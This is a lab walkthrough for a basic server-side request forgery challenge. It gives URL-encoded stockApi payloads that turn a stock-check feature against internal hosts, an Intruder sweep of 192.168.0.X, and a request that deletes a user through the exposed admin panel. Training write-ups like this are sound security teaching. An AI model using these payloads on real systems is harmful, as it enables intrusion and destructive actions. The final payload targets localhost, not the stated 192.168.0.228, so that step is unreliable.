## Basic SSRF against another back-end system

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

## Notes

- /product/stock
- /resources/js/stockCheck.js
- login

## Resume

1. Capture `/product/stock` request
2. Send request to intruder with `192.168.0.X`
3. Access the admin portal on `192.168.0.228` found with intruder
4. Delete user Carlos

## Solve 

Capture `/product/stock` request :

```
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

Update the ip with `192.168.0.X`. Send the request to intruder and set payload **numbers** from **1 to 255** on **X**

```
stockApi=http%3a%2f%2f192.168.0.1%3a8080%2fadmin
```

Filter by length and see that on payload **228** the answer contain : 

```html
                   <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/http://192.168.0.228:8080/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/http://192.168.0.228:8080/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
```

Update the request with `http://192.168.0.228:8080/admin/delete?username=carlos` and send it again to delete Carlos :

```
stockApi=http%3a%2f%2flocalhost%2fadmin%2fdelete%3fusername%3dcarlos
````
